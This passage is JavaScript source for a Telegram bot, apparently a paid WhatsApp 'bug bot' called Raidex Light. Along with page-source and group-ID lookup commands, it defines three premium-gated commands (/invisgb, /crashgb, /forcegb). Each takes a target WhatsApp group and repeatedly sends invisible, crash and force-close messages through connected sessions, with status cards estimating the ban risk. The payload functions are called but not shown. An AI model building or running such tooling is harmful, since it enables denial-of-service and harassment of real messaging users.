      responseType: "text",
      headers: { "User-Agent": "Mozilla/5.0 (compatible; Bot/1.0)" },
      timeout: 20000
    });
    const htmlContent = response.data;

    const filePath = path.join(__dirname, "web_source.html");
    fs.writeFileSync(filePath, htmlContent, "utf-8");

    await bot.sendDocument(chatId, filePath, {
      caption: `✅ Succes source url: ${url}`
    });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Error saat mengambil code");
  }
});

bot.onText(/\/info(?:\s+(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const user = msg.from;

  bot.sendMessage(chatId, `
*User Info*

Target : \`${user.id}\`
First Name : ${user.first_name || "-"}
Username : ${user.username ? "@" + user.username : "-"}
`, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{
          text: "〣 SALIN ID 〣",
          copy_text: { text: String(user.id) }
        }]
      ]
    }
  });
});

bot.onText(/\/cekidgb(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;

  try {
    const link = match[1];

    if (!link)
      return bot.sendMessage(
        chatId,
        "🪧 ☇ Format: /cekidgb https://chat.whatsapp.com/XXXXX"
      );

    const linkMatch = link.match(
      /chat\.whatsapp\.com\/([A-Za-z0-9_-]{10,})/
    );

    if (!linkMatch)
      return bot.sendMessage(chatId, "❌ ☇ Link grup tidak valid");

    if (!sock)
      return bot.sendMessage(chatId, "❌ ☇ Socket belum siap");

    const inviteCode = linkMatch[1];
    const info = await sock.groupGetInviteInfo(inviteCode);

    const groupId = info.id || "-";
    const subject = info.subject || "-";
    const owner = info.owner || "-";
    const size = info.size || 0;

    await bot.sendMessage(
      chatId,
`╭═───⊱ GROUP INFO ───═⬡
│ ⸙ Name
│ᯓ➤ *${subject}*
│ ⸙ Group ID
│ᯓ➤ *${groupId}*
│ ⸙ Owner
│ᯓ➤ *${owner}*
│ ⸙ Members
│ᯓ➤ *${size}*
╰═─────────────═⬡`,
      { parse_mode: "Markdown" }
    );

  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ ☇ Gagal mengambil ID grup");
  }
});

// Case Bug Group ada 3
bot.onText(/\/invisgb(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Jeda dulu ya kak! ${cooldown}s`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === userId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, "raidex.png", {
      caption: `
<blockquote>❌ Akses Ditolak!!</blockquote>

<b>Features Premium Only.</b>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          {
            text: "ᴄᴏɴᴛᴀᴄᴛ ᴏᴡɴᴇʀ",
            url: "https://t.me/VorzaOffc"
          }
        ]]
      }
    });
  }

  try {
    if (!sessions || sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addbot 62xxx"
      );
    }

    let number = match[1];
    if (!number)
      return bot.sendMessage(chatId, `🪧 ☇ Format: /invisgb @g.us`);

    let target = number.replace(/[^0-9]/g, "") + "@g.us";

    const processMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/hcqdcj.jpg", {
      caption: `
<blockquote><strong>╭═───⊱ 𝐑𝐀𝐈𝐃𝐄𝐗 𝐋𝐈𝐆𝐇𝐓 ───═⬡
│ ⸙ Target Group
│ᯓ➤ ${number}
│ ⸙ Type
│ᯓ➤ Invisible Message Group
│ ⸙ Potential Ban
│ᯓ➤ 60.0% ( High )
│ ⸙ Status
│ᯓ➤ ⌛ Process 
╰═─────────────═⬡</strong></blockquote>
`,
      parse_mode: "HTML"
    });

    const processMessageId = processMessage.message_id;

    for (let i = 0; i < 5; i++) {
      await SpamInvisgb(sock, target);
      await slowDelay();
      await GroupFC(sock, target);
      await slowDelay();
    }

    await bot.editMessageCaption(
      `
<blockquote><strong>╭═───⊱ 𝐑𝐀𝐈𝐃𝐄𝐗 𝐋𝐈𝐆𝐇𝐓 ───═⬡
│ ⸙ Target Group
│ᯓ➤ ${number}
│ ⸙ Type
│ᯓ➤ Invisible Message Group
│ ⸙ Potential Ban
│ᯓ➤ 60.0% ( High )
│ ⸙ Status
│ᯓ➤ ✅ Success
╰═─────────────═⬡</strong></blockquote>
`,
      {
        chat_id: chatId,
        message_id: processMessageId,
        parse_mode: "HTML",
      }
    );

  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat proses.");
  }
});

// 02
bot.onText(/\/crashgb(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Jeda dulu ya kak! ${cooldown}s`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === userId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, "raidex.png", {
      caption: `
<blockquote>❌ Akses Ditolak!!</blockquote>

<b>Features Premium Only.</b>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          {
            text: "ᴄᴏɴᴛᴀᴄᴛ ᴏᴡɴᴇʀ",
            url: "https://t.me/VorzaOffc"
          }
        ]]
      }
    });
  }

  try {
    if (!sessions || sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addbot 62xxx"
      );
    }

    let number = match[1];
    if (!number)
      return bot.sendMessage(chatId, `🪧 ☇ Format: /crashgb @g.us`);

    let target = number.replace(/[^0-9]/g, "") + "@g.us";

    const processMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/hcqdcj.jpg", {
      caption: `
<blockquote><strong>╭═───⊱ 𝐑𝐀𝐈𝐃𝐄𝐗 𝐋𝐈𝐆𝐇𝐓 ───═⬡
│ ⸙ Target Group
│ᯓ➤ ${number}
│ ⸙ Type
│ᯓ➤ Crash Message Group
│ ⸙ Potential Ban
│ᯓ➤ 60.0% ( High )
│ ⸙ Status
│ᯓ➤ ⌛ Process
╰═─────────────═⬡</strong></blockquote>
`,
      parse_mode: "HTML"
    });

    const processMessageId = processMessage.message_id;

    for (let i = 0; i < 5; i++) {
      await groupUiCrash(target);
      await slowDelay();
      await SpamInvisgb(sock, target);
      await slowDelay();
    }

    await bot.editMessageCaption(
      `
<blockquote><strong>╭═───⊱ 𝐑𝐀𝐈𝐃𝐄𝐗 𝐋𝐈𝐆𝐇𝐓 ───═⬡
│ ⸙ Target Group
│ᯓ➤ ${number}
│ ⸙ Type
│ᯓ➤ Crash Message Group
│ ⸙ Potential Ban
│ᯓ➤ 60.0% ( High )
│ ⸙ Status
│ᯓ➤ ✅ Success
╰═─────────────═⬡</strong></blockquote>
`,
      {
        chat_id: chatId,
        message_id: processMessageId,
        parse_mode: "HTML",
      }
    );

  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat proses.");
  }
});

// 03
bot.onText(/\/forcegb(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Jeda dulu ya kak! ${cooldown}s`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === userId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, "raidex.png", {
      caption: `
<blockquote>❌ Akses Ditolak!!</blockquote>

<b>Features Premium Only.</b>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          {
            text: "ᴄᴏɴᴛᴀᴄᴛ ᴏᴡɴᴇʀ",
            url: "https://t.me/VorzaOffc"
          }
        ]]
      }
    });
  }

  try {
    if (!sessions || sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addbot 62xxx"
      );
    }

    let number = match[1];
    if (!number)
      return bot.sendMessage(chatId, `🪧 ☇ Format: /forcegb @g.us`);

    let target = number.replace(/[^0-9]/g, "") + "@g.us";

    const processMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/hcqdcj.jpg", {
      caption: `
<blockquote><strong>╭═───⊱ 𝐑𝐀𝐈𝐃𝐄𝐗 𝐋𝐈𝐆𝐇𝐓 ───═⬡
│ ⸙ Target Group
│ᯓ➤ ${number}
│ ⸙ Type
│ᯓ➤ ForceClose Group
│ ⸙ Potential Ban
│ᯓ➤ 60.0% ( High )
│ ⸙ Status
│ᯓ➤ ⌛ Process
╰═─────────────═⬡</strong></blockquote>
`,
      parse_mode: "HTML"
    });

    const processMessageId = processMessage.message_id;

    for (let i = 0; i < 5; i++) {
      await SpamInvisgb(sock, target);
      await slowDelay();
      await GroupFC(sock, target);
      await slowDelay();
    }

    await bot.editMessageCaption(
      `
<blockquote><strong>╭═───⊱ 𝐑𝐀𝐈𝐃𝐄𝐗 𝐋𝐈𝐆𝐇𝐓 ───═⬡
│ ⸙ Target Group
│ᯓ➤ ${number}
│ ⸙ Type
│ᯓ➤ ForceClose Group
│ ⸙ Potential Ban
│ᯓ➤ 60.0% ( High )
│ ⸙ Status
│ᯓ➤ ✅ Success
╰═─────────────═⬡</strong></blockquote>
`,
      {
        chat_id: chatId,
        message_id: processMessageId,
        parse_mode: "HTML",
      }
    );

  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat proses.");
  }
});